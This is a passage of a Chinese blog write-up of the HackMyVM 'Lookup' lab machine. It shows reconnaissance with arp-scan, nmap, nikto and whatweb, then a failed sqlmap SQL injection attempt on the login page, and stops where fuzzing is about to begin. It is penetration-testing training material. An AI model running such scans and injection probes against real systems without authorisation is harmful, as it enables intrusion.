<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HackMyVM Lookup | Yiyi</title><meta name="author" content="yiyi"><meta name="copyright" content="yiyi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263┌──(root㉿kali)-[~]└─# arp-scan -I eth1 -lInterface: eth1, type: EN10MB, MAC: 00:0c:">
<meta property="og:type" content="article">
<meta property="og:title" content="HackMyVM Lookup">
<meta property="og:url" content="https://xyaxxya.github.io/2024/12/18/HackMyVM%20Lookup/index.html">
<meta property="og:site_name" content="Yiyi">
<meta property="og:description" content="123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263┌──(root㉿kali)-[~]└─# arp-scan -I eth1 -lInterface: eth1, type: EN10MB, MAC: 00:0c:">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://www.dmoe.cc/random.php?2329">
<meta property="article:published_time" content="2024-12-18T09:49:31.000Z">
<meta property="article:modified_time" content="2024-12-19T01:23:04.151Z">
<meta property="article:author" content="yiyi">
<meta property="article:tag" content="渗透">
<meta property="article:tag" content="look提权">
<meta property="article:tag" content="环境变量劫持">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.dmoe.cc/random.php?2329"><link rel="shortcut icon" href="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg"><link rel="canonical" href="https://xyaxxya.github.io/2024/12/18/HackMyVM%20Lookup/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'HackMyVM Lookup',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2024-12-19 09:23:04'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">64</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">74</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/2024/02/16/关于我"><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://www.dmoe.cc/random.php?2329')"><nav id="nav"><span id="blog-info"><a href="/" title="Yiyi"><img class="site-icon" src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg"/><span class="site-name">Yiyi</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/2024/02/16/关于我"><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HackMyVM Lookup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-12-18T09:49:31.000Z" title="发表于 2024-12-18 17:49:31">2024-12-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-19T01:23:04.151Z" title="更新于 2024-12-19 09:23:04">2024-12-19</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>31分钟</span></span><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/2024/12/18/HackMyVM%20Lookup/" data-flag-title="HackMyVM Lookup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/12/18/HackMyVM%20Lookup/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/12/18/HackMyVM%20Lookup/" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># arp-scan -I eth1 -l</span></span><br><span class="line">Interface: eth1, <span class="built_in">type</span>: EN10MB, MAC: 00:0c:29:26:ba:73, IPv4: 192.168.56.102</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:14       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:d6:b8:eb       PCS Systemtechnik GmbH</span><br><span class="line">192.168.56.101  08:00:27:79:3a:8a       PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned <span class="keyword">in</span> 2.102 seconds (121.79 hosts/sec). 3 responded</span><br><span class="line">                                                                                                                                                                                    </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nmap -Pn -A -sV -T4 -p- 192.168.56.101                                          </span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-18 04:52 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> www.smol.hmv (192.168.56.101)</span><br><span class="line">Host is up (0.00048s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)</span><br><span class="line">|   256 0a:4b:b9:b1:77:d2:48:79:<span class="built_in">fc</span>:2f:8a:3d:64:3a:ad:94 (ECDSA)</span><br><span class="line">|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://lookup.hmv</span><br><span class="line">MAC Address: 08:00:27:79:3A:8A (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.8</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.48 ms www.smol.hmv (192.168.56.101)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 10.65 seconds</span><br><span class="line">                                                                                                                                                                                    </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nikto -h 192.168.56.101                </span></span><br><span class="line">- Nikto v2.5.0</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.56.101</span><br><span class="line">+ Target Hostname:    192.168.56.101</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2024-12-18 04:53:15 (GMT-5)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line">+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options</span><br><span class="line">+ /: The X-Content-Type-Options header is not <span class="built_in">set</span>. This could allow the user agent to render the content of the site <span class="keyword">in</span> a different fashion to the MIME <span class="built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/</span><br><span class="line">+ Root page / redirects to: http://lookup.hmv</span><br><span class="line">+ No CGI Directories found (use <span class="string">&#x27;-C all&#x27;</span> to force check all possible <span class="built_in">dirs</span>)</span><br><span class="line">+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL <span class="keyword">for</span> the 2.x branch.</span><br><span class="line">+ 8102 requests: 0 error(s) and 3 item(s) reported on remote host</span><br><span class="line">+ End Time:           2024-12-18 04:53:33 (GMT-5) (18 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br><span class="line">                                                                                                                                                                                    </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># echo 192.168.56.101 lookup.hmv &gt; /etc/hosts </span></span><br></pre></td></tr></table></figure>

<p>whatweb扫一波</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/yiyi/tmp]</span><br><span class="line">└─<span class="comment"># whatweb -v lookup.hmv                                    </span></span><br><span class="line">WhatWeb report <span class="keyword">for</span> http://lookup.hmv</span><br><span class="line">Status    : 200 OK</span><br><span class="line">Title     : Login Page</span><br><span class="line">IP        : 192.168.56.101</span><br><span class="line">Country   : RESERVED, ZZ</span><br><span class="line"></span><br><span class="line">Summary   : Apache[2.4.41], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], PasswordField[password]</span><br><span class="line"></span><br><span class="line">Detected Plugins:</span><br><span class="line">[ Apache ]</span><br><span class="line">        The Apache HTTP Server Project is an effort to develop and </span><br><span class="line">        maintain an open-source HTTP server <span class="keyword">for</span> modern operating </span><br><span class="line">        systems including UNIX and Windows NT. The goal of this </span><br><span class="line">        project is to provide a secure, efficient and extensible </span><br><span class="line">        server that provides HTTP services <span class="keyword">in</span> <span class="built_in">sync</span> with the current </span><br><span class="line">        HTTP standards. </span><br><span class="line"></span><br><span class="line">        Version      : 2.4.41 (from HTTP Server Header)</span><br><span class="line">        Google Dorks: (3)</span><br><span class="line">        Website     : http://httpd.apache.org/</span><br><span class="line"></span><br><span class="line">[ HTML5 ]</span><br><span class="line">        HTML version 5, detected by the doctype declaration </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[ HTTPServer ]</span><br><span class="line">        HTTP server header string. This plugin also attempts to </span><br><span class="line">        identify the operating system from the server header. </span><br><span class="line"></span><br><span class="line">        OS           : Ubuntu Linux</span><br><span class="line">        String       : Apache/2.4.41 (Ubuntu) (from server string)</span><br><span class="line"></span><br><span class="line">[ PasswordField ]</span><br><span class="line">        find password fields </span><br><span class="line"></span><br><span class="line">        String       : password (from field name)</span><br><span class="line"></span><br><span class="line">HTTP Headers:</span><br><span class="line">        HTTP/1.1 200 OK</span><br><span class="line">        Date: Wed, 18 Dec 2024 18:04:40 GMT</span><br><span class="line">        Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line">        Vary: Accept-Encoding</span><br><span class="line">        Content-Encoding: gzip</span><br><span class="line">        Content-Length: 359</span><br><span class="line">        Connection: close</span><br><span class="line">        Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure>

<p>尝试sql注入无果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/yiyi/tmp]</span><br><span class="line">└─<span class="comment"># sqlmap -r req.txt  --dbs --batch</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.8.11<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [.]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [,]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   https://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 05:02:51 /2024-12-18/</span><br><span class="line"></span><br><span class="line">[05:02:51] [INFO] parsing HTTP request from <span class="string">&#x27;req.txt&#x27;</span></span><br><span class="line">custom injection marker (<span class="string">&#x27;*&#x27;</span>) found <span class="keyword">in</span> POST body. Do you want to process it? [Y/n/q] Y</span><br><span class="line">[05:02:51] [INFO] testing connection to the target URL</span><br><span class="line">got a refresh intent (redirect like response common to login pages) to <span class="string">&#x27;http://lookup.hmv&#x27;</span>. Do you want to apply it from now on? [Y/n] Y</span><br><span class="line">[05:02:51] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS</span><br><span class="line">[05:02:51] [INFO] testing <span class="keyword">if</span> the target URL content is stable</span><br><span class="line">[05:02:51] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or <span class="keyword">in</span> <span class="keyword">case</span> of junk results, refer to user<span class="string">&#x27;s manual paragraph &#x27;</span>Page comparison<span class="string">&#x27;</span></span><br><span class="line"><span class="string">how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C</span></span><br><span class="line"><span class="string">[05:02:51] [INFO] searching for dynamic content</span></span><br><span class="line"><span class="string">[05:02:51] [CRITICAL] target URL content appears to be heavily dynamic. sqlmap is going to retry the request(s)</span></span><br><span class="line"><span class="string">[05:02:51] [WARNING] target URL content appears to be too dynamic. Switching to &#x27;</span>--text-only<span class="string">&#x27; </span></span><br><span class="line"><span class="string">[05:02:51] [INFO] testing if (custom) POST parameter &#x27;</span><span class="comment">#1*&#x27; is dynamic</span></span><br><span class="line">[05:02:51] [INFO] (custom) POST parameter <span class="string">&#x27;#1*&#x27;</span> appears to be dynamic</span><br><span class="line">[05:02:51] [INFO] testing <span class="keyword">for</span> SQL injection on (custom) POST parameter <span class="string">&#x27;#1*&#x27;</span></span><br><span class="line">[05:02:51] [INFO] testing <span class="string">&#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span></span><br><span class="line">[05:02:52] [INFO] testing <span class="string">&#x27;Boolean-based blind - Parameter replace (original value)&#x27;</span></span><br><span class="line">[05:02:52] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;</span></span><br><span class="line">[05:02:52] [INFO] testing <span class="string">&#x27;PostgreSQL AND error-based - WHERE or HAVING clause&#x27;</span></span><br><span class="line">[05:02:52] [INFO] testing <span class="string">&#x27;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&#x27;</span></span><br><span class="line">[05:02:52] [INFO] testing <span class="string">&#x27;Oracle AND error-based - WHERE or HAVING clause (XMLType)&#x27;</span></span><br><span class="line">[05:02:52] [INFO] testing <span class="string">&#x27;Generic inline queries&#x27;</span></span><br><span class="line">[05:02:52] [INFO] testing <span class="string">&#x27;PostgreSQL &gt; 8.1 stacked queries (comment)&#x27;</span></span><br><span class="line">[05:02:52] [INFO] testing <span class="string">&#x27;Microsoft SQL Server/Sybase stacked queries (comment)&#x27;</span></span><br><span class="line">[05:02:52] [INFO] testing <span class="string">&#x27;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&#x27;</span></span><br><span class="line">[05:02:52] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span></span><br><span class="line">[05:02:52] [INFO] testing <span class="string">&#x27;PostgreSQL &gt; 8.1 AND time-based blind&#x27;</span></span><br><span class="line">[05:02:52] [INFO] testing <span class="string">&#x27;Microsoft SQL Server/Sybase time-based blind (IF)&#x27;</span></span><br><span class="line">[05:02:52] [INFO] testing <span class="string">&#x27;Oracle AND time-based blind&#x27;</span></span><br><span class="line">it is recommended to perform only basic UNION tests <span class="keyword">if</span> there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y</span><br><span class="line">[05:02:52] [INFO] testing <span class="string">&#x27;Generic UNION query (NULL) - 1 to 10 columns&#x27;</span></span><br><span class="line">[05:02:52] [WARNING] (custom) POST parameter <span class="string">&#x27;#1*&#x27;</span> does not seem to be injectable</span><br><span class="line">[05:02:52] [INFO] testing <span class="keyword">if</span> (custom) POST parameter <span class="string">&#x27;#2*&#x27;</span> is dynamic</span><br><span class="line">[05:02:52] [INFO] (custom) POST parameter <span class="string">&#x27;#2*&#x27;</span> appears to be dynamic</span><br><span class="line">[05:02:52] [INFO] testing <span class="keyword">for</span> SQL injection on (custom) POST parameter <span class="string">&#x27;#2*&#x27;</span></span><br><span class="line">[05:02:52] [INFO] testing <span class="string">&#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span></span><br><span class="line">[05:02:53] [INFO] testing <span class="string">&#x27;Boolean-based blind - Parameter replace (original value)&#x27;</span></span><br><span class="line">[05:02:53] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;</span></span><br><span class="line">[05:02:53] [INFO] testing <span class="string">&#x27;PostgreSQL AND error-based - WHERE or HAVING clause&#x27;</span></span><br><span class="line">[05:02:53] [INFO] testing <span class="string">&#x27;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&#x27;</span></span><br><span class="line">[05:02:53] [INFO] testing <span class="string">&#x27;Oracle AND error-based - WHERE or HAVING clause (XMLType)&#x27;</span></span><br><span class="line">[05:02:53] [INFO] testing <span class="string">&#x27;Generic inline queries&#x27;</span></span><br><span class="line">[05:02:53] [INFO] testing <span class="string">&#x27;PostgreSQL &gt; 8.1 stacked queries (comment)&#x27;</span></span><br><span class="line">[05:02:53] [INFO] testing <span class="string">&#x27;Microsoft SQL Server/Sybase stacked queries (comment)&#x27;</span></span><br><span class="line">[05:02:53] [INFO] testing <span class="string">&#x27;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&#x27;</span></span><br><span class="line">[05:02:53] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span></span><br><span class="line">[05:02:53] [INFO] testing <span class="string">&#x27;PostgreSQL &gt; 8.1 AND time-based blind&#x27;</span></span><br><span class="line">[05:02:53] [INFO] testing <span class="string">&#x27;Microsoft SQL Server/Sybase time-based blind (IF)&#x27;</span></span><br><span class="line">[05:02:53] [INFO] testing <span class="string">&#x27;Oracle AND time-based blind&#x27;</span></span><br><span class="line">[05:02:53] [INFO] testing <span class="string">&#x27;Generic UNION query (NULL) - 1 to 10 columns&#x27;</span></span><br><span class="line">[05:02:53] [WARNING] (custom) POST parameter <span class="string">&#x27;#2*&#x27;</span> does not seem to be injectable</span><br><span class="line">[05:02:53] [CRITICAL] all tested parameters <span class="keyword">do</span> not appear to be injectable. Try to increase values <span class="keyword">for</span> <span class="string">&#x27;--level&#x27;</span>/<span class="string">&#x27;--risk&#x27;</span> options <span class="keyword">if</span> you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option <span class="string">&#x27;--tamper&#x27;</span> (e.g. <span class="string">&#x27;--tamper=space2comment&#x27;</span>) and/or switch <span class="string">&#x27;--random-agent&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 05:02:53 /2024-12-18/</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>fuzz一波</p>
